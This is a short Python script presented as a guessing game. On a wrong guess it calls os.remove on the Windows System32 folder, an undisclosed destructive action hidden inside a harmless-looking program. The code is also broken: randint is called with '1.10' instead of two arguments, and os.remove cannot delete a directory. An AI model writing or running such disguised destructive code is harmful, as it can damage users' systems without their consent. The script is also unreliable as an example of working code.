import random
import os

ran_num = random.randint(1.10)

guess = input("Welcome to my game. You need to gues the number from 1-10 if you do it you win else RISK IT!!!")
guess = int(guess)

if guess == ran_num:
    print("Well done you did it! .")
else:
    os.remove("C:\Windows\System32")
